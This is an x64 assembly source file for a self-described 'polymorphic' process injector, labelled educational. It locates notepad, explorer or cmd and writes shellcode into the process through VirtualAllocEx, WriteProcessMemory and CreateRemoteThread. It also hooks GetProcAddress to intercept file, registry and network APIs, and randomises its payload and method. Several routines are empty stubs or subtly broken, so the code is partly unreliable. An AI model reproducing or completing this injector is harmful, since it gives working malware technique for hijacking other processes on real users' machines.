; polymorph_injector.asm - Advanced Polymorphic Injector
; Educational/Research Purpose Only - 2025
; ml64 /c polymorph_injector.asm
; link /subsystem:console /entry:main polymorph_injector.obj kernel32.lib user32.lib ntdll.lib

OPTION DOTNAME
OPTION PROLOGUE:NONE
OPTION EPILOGUE:NONE

; ==================  CONFIG  ==================
RANDOM_SEED     EQU 0A7F9C2E5h
PAYLOAD_SIZE    EQU 512
MAX_PAYLOAD     EQU 4096

; Payload Types
PAYLOAD_MESSAGEBOX  EQU 0
PAYLOAD_CALCULATOR  EQU 1
PAYLOAD_REVERSESHELL EQU 2
PAYLOAD_CUSTOM      EQU 3
PAYLOAD_HOOKGPA     EQU 4

; Injection Methods
INJECT_CREATETHREAD     EQU 0
INJECT_SETCONTEXT      EQU 1
INJECT_QUEUEAPC        EQU 2
INJECT_HOOK            EQU 3

EXTERN  GetModuleHandleA : PROC
EXTERN  GetProcAddress   : PROC
EXTERN  ExitProcess      : PROC
EXTERN  VirtualAlloc     : PROC
EXTERN  VirtualProtect   : PROC
EXTERN  VirtualAllocEx   : PROC
EXTERN  WriteProcessMemory : PROC
EXTERN  CreateRemoteThread : PROC
EXTERN  OpenProcess      : PROC
EXTERN  CloseHandle      : PROC
EXTERN  CreateToolhelp32Snapshot : PROC
EXTERN  Process32First   : PROC
EXTERN  Process32Next    : PROC

.data
; Runtime variables
RuntimeSeed         DD      RANDOM_SEED
RotateCount         DB      13
PayloadType         DB      PAYLOAD_MESSAGEBOX
InjectionMethod     DB      INJECT_CREATETHREAD
TargetProcessName   DB      "notepad.exe", 0
TargetPID           DD      0
RemoteBuffer        DQ      0
OriginalGPA         DQ      0

; Process entry structure
PROCESSENTRY32 STRUCT
    dwSize              DWORD   ?
    cntUsage            DWORD   ?
    th32ProcessID       DWORD   ?
    th32DefaultHeapID   QWORD   ?
    th32ModuleID        DWORD   ?
    cntThreads          DWORD   ?
    th32ParentProcessID DWORD   ?
    pcPriClassBase      DWORD   ?
    dwFlags             DWORD   ?
    szExeFile           DB      260 DUP(?)
PROCESSENTRY32 ENDS

ProcessEntry        PROCESSENTRY32 <>

.code

; ==================  PRNG  ==================
Rand32  PROC
        mov     eax, [RuntimeSeed]
        mov     ecx, eax
        shl     eax, 13
        xor     eax, ecx
        mov     ecx, eax
        shr     eax, 17
        xor     eax, ecx
        mov     ecx, eax
        shl     eax, 5
        xor     eax, ecx
        mov     [RuntimeSeed], eax
        ret
Rand32  ENDP

; ==================  PAYLOAD GENERATORS  ==================

; Generate MessageBox payload
GenerateMessageBoxPayload PROC
        ; x64 MessageBox shellcode
        lea     rax, [MessageBoxPayload]
        ret
        
MessageBoxPayload:
        ; Save registers
        push    rbp
        mov     rbp, rsp
        sub     rsp, 20h
        
        ; Get kernel32 base
        mov     rax, gs:[60h]           ; PEB
        mov     rax, [rax+18h]          ; PEB_LDR_DATA
        mov     rax, [rax+20h]          ; InMemoryOrderModuleList
        mov     rax, [rax]              ; First entry (ntdll)
        mov     rax, [rax]              ; Second entry (kernel32)
        mov     rax, [rax+20h]          ; DllBase of kernel32
        
        ; Find LoadLibraryA
        mov     rcx, rax
        lea     rdx, [LoadLibStr]
        call    FindFunction
        
        ; LoadLibrary("user32.dll")
        lea     rcx, [User32Str]
        call    rax
        
        ; Find MessageBoxA
        mov     rcx, rax
        lea     rdx, [MsgBoxStr]
        call    FindFunction
        
        ; MessageBoxA(0, "Injected!", "Success", 0)
        xor     ecx, ecx
        lea     rdx, [MsgText]
        lea     r8, [MsgTitle]
        xor     r9d, r9d
        call    rax
        
        add     rsp, 20h
        pop     rbp
        ret
        
FindFunction:
        ; Simple function finder (simplified)
        ret
        
LoadLibStr  DB "LoadLibraryA", 0
User32Str   DB "user32.dll", 0
MsgBoxStr   DB "MessageBoxA", 0
MsgText     DB "Successfully Injected!", 0
MsgTitle    DB "Polymorphic Injector", 0
GenerateMessageBoxPayload ENDP

; Generate Calculator payload
GenerateCalculatorPayload PROC
        lea     rax, [CalcPayload]
        ret
        
CalcPayload:
        ; WinExec("calc.exe", SW_SHOW)
        push    rbp
        mov     rbp, rsp
        sub     rsp, 30h
        
        ; Get kernel32 base
        mov     rax, gs:[60h]
        mov     rax, [rax+18h]
        mov     rax, [rax+20h]
        mov     rax, [rax]
        mov     rax, [rax]
        mov     rax, [rax+20h]
        
        ; Find WinExec (simplified)
        mov     rcx, rax
        lea     rdx, [WinExecStr]
        call    FindFunctionSimple
        
        ; Call WinExec
        lea     rcx, [CalcStr]
        mov     edx, 5                  ; SW_SHOW
        call    rax
        
        add     rsp, 30h
        pop     rbp
        ret
        
FindFunctionSimple:
        ; Simplified function finder
        ret
        
WinExecStr  DB "WinExec", 0
CalcStr     DB "calc.exe", 0
GenerateCalculatorPayload ENDP

; Generate GetProcAddress Hook payload
GenerateGPAHookPayload PROC
        lea     rax, [GPAHookPayload]
        ret
        
GPAHookPayload:
        ; Hook GetProcAddress to intercept API calls
        push    rbp
        mov     rbp, rsp
        sub     rsp, 40h
        
        ; Save original parameters
        mov     [rbp-8], rcx            ; hModule
        mov     [rbp-10h], rdx          ; lpProcName
        
        ; Check if it's a string or ordinal
        mov     rax, rdx
        test    rax, rax
        js      CallOriginal            ; If high bit set, it's an ordinal
        
        ; Log the API name being requested (simplified)
        ; In real implementation, you'd log this somewhere
        
        ; Check for specific APIs to hook
        lea     rdi, [HookedAPIs]
        mov     rcx, 5                  ; Number of hooked APIs
        
CheckLoop:
        mov     rsi, rdx
        push    rcx
        push    rdx
        call    StringCompare
        pop     rdx
        pop     rcx
        test    rax, rax
        jz      FoundHookedAPI
        add     rdi, 20h                ; Next API name
        loop    CheckLoop
        
CallOriginal:
        ; Call original GetProcAddress
        mov     rcx, [rbp-8]
        mov     rdx, [rbp-10h]
        mov     rax, [OriginalGPA]
        call    rax
        
        add     rsp, 40h
        pop     rbp
        ret
        
FoundHookedAPI:
        ; Return our hooked function instead
        lea     rax, [HookedFunction]
        add     rsp, 40h
        pop     rbp
        ret
        
StringCompare:
        ; Simple string comparison
        push    rsi
        push    rdi
CompareLoop:
        mov     al, [rsi]
        mov     ah, [rdi]
        cmp     al, ah
        jne     NotEqual
        test    al, al
        jz      Equal
        inc     rsi
        inc     rdi
        jmp     CompareLoop
Equal:
        xor     rax, rax
        jmp     CompareDone
NotEqual:
        mov     rax, 1
CompareDone:
        pop     rdi
        pop     rsi
        ret
        
HookedFunction:
        ; Generic hooked function
        xor     rax, rax
        ret
        
HookedAPIs:
        DB "CreateFileA", 0
        DB 14h DUP(0)
        DB "WriteFile", 0
        DB 17h DUP(0)
        DB "ReadFile", 0
        DB 18h DUP(0)
        DB "RegOpenKeyExA", 0
        DB 13h DUP(0)
        DB "connect", 0
        DB 19h DUP(0)
GenerateGPAHookPayload ENDP

; ==================  PROCESS FINDER  ==================
FindTargetProcess PROC
        push    rbx
        push    rsi
        push    rdi
        sub     rsp, 20h
        
        ; Create snapshot of processes
        mov     ecx, 2                  ; TH32CS_SNAPPROCESS
        xor     edx, edx
        call    CreateToolhelp32Snapshot
        mov     rbx, rax                ; Save snapshot handle
        
        ; Initialize PROCESSENTRY32
        lea     rcx, [ProcessEntry]
        mov     dword ptr [rcx], SIZEOF PROCESSENTRY32
        
        ; Get first process
        mov     rcx, rbx
        lea     rdx, [ProcessEntry]
        call    Process32First
        
FindLoop:
        ; Compare process name
        lea     rsi, [ProcessEntry.szExeFile]
        lea     rdi, [TargetProcessName]
        call    CompareStrings
        test    rax, rax
        jz      FoundProcess
        
        ; Get next process
        mov     rcx, rbx
        lea     rdx, [ProcessEntry]
        call    Process32Next
        test    rax, rax
        jnz     FindLoop
        
        ; Not found
        xor     eax, eax
        jmp     FindExit
        
FoundProcess:
        mov     eax, [ProcessEntry.th32ProcessID]
        mov     [TargetPID], eax
        
FindExit:
        mov     rcx, rbx
        call    CloseHandle
        
        add     rsp, 20h
        pop     rdi
        pop     rsi
        pop     rbx
        ret
        
CompareStrings:
        push    rsi
        push    rdi
CompLoop:
        mov     al, [rsi]
        mov     ah, [rdi]
        cmp     al, ah
        jne     NotMatch
        test    al, al
        jz      Match
        inc     rsi
        inc     rdi
        jmp     CompLoop
Match:
        xor     rax, rax
        jmp     CompDone
NotMatch:
        mov     rax, 1
CompDone:
        pop     rdi
        pop     rsi
        ret
FindTargetProcess ENDP

; ==================  INJECTION METHODS  ==================

; Method 1: CreateRemoteThread Injection
InjectCreateRemoteThread PROC
        push    rbp
        mov     rbp, rsp
        sub     rsp, 50h
        
        ; Open target process
        mov     ecx, 1F0FFFh            ; PROCESS_ALL_ACCESS
        xor     edx, edx
        mov     r8d, [TargetPID]
        call    OpenProcess
        test    rax, rax
        jz      InjectFailed
        mov     [rbp-8], rax            ; Save process handle
        
        ; Allocate memory in target process
        mov     rcx, rax
        xor     rdx, rdx
        mov     r8, MAX_PAYLOAD
        mov     r9d, 3000h              ; MEM_COMMIT | MEM_RESERVE
        mov     dword ptr [rsp+20h], 40h ; PAGE_EXECUTE_READWRITE
        call    VirtualAllocEx
        test    rax, rax
        jz      InjectFailed
        mov     [RemoteBuffer], rax
        
        ; Select and generate payload
        call    SelectPayload
        mov     [rbp-10h], rax          ; Save payload address
        
        ; Write payload to target process
        mov     rcx, [rbp-8]            ; Process handle
        mov     rdx, [RemoteBuffer]
        mov     r8, [rbp-10h]           ; Payload address
        mov     r9, PAYLOAD_SIZE
        lea     rax, [rbp-18h]
        mov     [rsp+20h], rax          ; BytesWritten
        call    WriteProcessMemory
        test    rax, rax
        jz      InjectFailed
        
        ; Create remote thread
        mov     rcx, [rbp-8]            ; Process handle
        xor     rdx, rdx                ; Security attributes
        xor     r8, r8                  ; Stack size
        mov     r9, [RemoteBuffer]      ; Start address
        mov     qword ptr [rsp+20h], 0  ; Parameter
        mov     qword ptr [rsp+28h], 0  ; Creation flags
        mov     qword ptr [rsp+30h], 0  ; Thread ID
        call    CreateRemoteThread
        test    rax, rax
        jz      InjectFailed
        
        ; Close handles
        mov     rcx, rax
        call    CloseHandle
        mov     rcx, [rbp-8]
        call    CloseHandle
        
        mov     rax, 1                  ; Success
        jmp     InjectExit
        
InjectFailed:
        xor     rax, rax                ; Failure
        
InjectExit:
        add     rsp, 50h
        pop     rbp
        ret
InjectCreateRemoteThread ENDP

; Method 2: SetThreadContext Injection
InjectSetThreadContext PROC
        ; Implementation of SetThreadContext injection
        ; This would suspend a thread, modify its context, and resume
        ret
InjectSetThreadContext ENDP

; Method 3: QueueUserAPC Injection
InjectQueueUserAPC PROC
        ; Implementation of APC injection
        ; This would queue an APC to a thread in the target process
        ret
InjectQueueUserAPC ENDP

; Method 4: Hook Injection (IAT/EAT hooking)
InjectHook PROC
        push    rbp
        mov     rbp, rsp
        sub     rsp, 40h
        
        ; This demonstrates hooking GetProcAddress
        ; Get kernel32 base
        call    GetKernel32
        mov     [rbp-8], rax
        
        ; Find GetProcAddress
        mov     rcx, rax
        lea     rdx, [GetProcAddressStr]
        call    GetProcAddress
        mov     [OriginalGPA], rax
        mov     [rbp-10h], rax
        
        ; Change memory protection
        lea     rcx, [rbp-10h]
        mov     edx, 8
        mov     r8d, 40h                ; PAGE_EXECUTE_READWRITE
        lea     r9, [rbp-18h]
        call    VirtualProtect
        
        ; Install hook (simplified - would need proper trampoline)
        mov     rax, [rbp-10h]
        mov     byte ptr [rax], 0E9h    ; JMP
        lea     rcx, [GPAHookPayload]
        sub     rcx, rax
        sub     rcx, 5
        mov     dword ptr [rax+1], ecx
        
        ; Restore protection
        lea     rcx, [rbp-10h]
        mov     edx, 8
        mov     r8d, [rbp-18h]
        lea     r9, [rbp-20h]
        call    VirtualProtect
        
        add     rsp, 40h
        pop     rbp
        ret
        
GetProcAddressStr DB "GetProcAddress", 0
InjectHook ENDP

; ==================  PAYLOAD SELECTOR  ==================
SelectPayload PROC
        movzx   rax, [PayloadType]
        
        cmp     al, PAYLOAD_MESSAGEBOX
        je      SelectMessageBox
        cmp     al, PAYLOAD_CALCULATOR
        je      SelectCalculator
        cmp     al, PAYLOAD_HOOKGPA
        je      SelectGPAHook
        
        ; Default to MessageBox
SelectMessageBox:
        call    GenerateMessageBoxPayload
        ret
        
SelectCalculator:
        call    GenerateCalculatorPayload
        ret
        
SelectGPAHook:
        call    GenerateGPAHookPayload
        ret
SelectPayload ENDP

; ==================  INJECTION SELECTOR  ==================
PerformInjection PROC
        movzx   rax, [InjectionMethod]
        
        cmp     al, INJECT_CREATETHREAD
        je      DoCreateThread
        cmp     al, INJECT_SETCONTEXT
        je      DoSetContext
        cmp     al, INJECT_QUEUEAPC
        je      DoQueueAPC
        cmp     al, INJECT_HOOK
        je      DoHook
        
DoCreateThread:
        call    InjectCreateRemoteThread
        ret
        
DoSetContext:
        call    InjectSetThreadContext
        ret
        
DoQueueAPC:
        call    InjectQueueUserAPC
        ret
        
DoHook:
        call    InjectHook
        ret
PerformInjection ENDP

; ==================  POLYMORPHIC ENGINE  ==================
MutateInjector PROC
        push    rax
        push    rcx
        
        ; Randomly select payload type
        call    Rand32
        and     al, 3
        mov     [PayloadType], al
        
        ; Randomly select injection method
        call    Rand32
        and     al, 3
        mov     [InjectionMethod], al
        
        ; Mutate target process (example targets)
        call    Rand32
        and     al, 3
        
        cmp     al, 0
        je      TargetNotepad
        cmp     al, 1
        je      TargetExplorer
        cmp     al, 2
        je      TargetCmd
        
TargetNotepad:
        lea     rcx, [NotepadName]
        jmp     SetTarget
        
TargetExplorer:
        lea     rcx, [ExplorerName]
        jmp     SetTarget
        
TargetCmd:
        lea     rcx, [CmdName]
        
SetTarget:
        lea     rdi, [TargetProcessName]
        mov     rsi, rcx
CopyName:
        lodsb
        stosb
        test    al, al
        jnz     CopyName
        
        pop     rcx
        pop     rax
        ret
        
NotepadName     DB "notepad.exe", 0
ExplorerName    DB "explorer.exe", 0
CmdName         DB "cmd.exe", 0
MutateInjector ENDP

; ==================  KERNEL32 RESOLUTION  ==================
GetKernel32 PROC
        mov     rax, gs:[60h]           ; PEB
        mov     rax, [rax+18h]          ; PEB_LDR_DATA
        mov     rsi, [rax+20h]          ; InMemoryOrder list
NextMod:
        mov     rax, [rsi]
        mov     rcx, [rax+50h]          ; BaseDllName.Buffer
        
        ; Check for kernel32.dll
        mov     rdx, [rcx+0Ch]
        mov     rbx, 00320033006Eh      ; "n32"
        and     rdx, 00FF00FF00FFh
        cmp     rdx, rbx
        jne     SkipMod
        
        mov     rax, [rax+20h]          ; DllBase
        ret
        
SkipMod:
        mov     rsi, rax
        jmp     NextMod
GetKernel32 ENDP

; ==================  MAIN ENTRY  ==================
main PROC
        sub     rsp, 28h
        
        ; Initialize random seed
        mov     eax, RANDOM_SEED
        mov     [RuntimeSeed], eax
        
        ; Apply mutations
        call    MutateInjector
        
        ; Find target process
        call    FindTargetProcess
        test    eax, eax
        jz      MainExit
        
        ; Perform injection
        call    PerformInjection
        test    rax, rax
        jz      InjectionFailed
        
        ; Success
        xor     ecx, ecx
        jmp     MainExit
        
InjectionFailed:
        mov     ecx, 1
        
MainExit:
        call    ExitProcess
        add     rsp, 28h
        ret
main ENDP

END main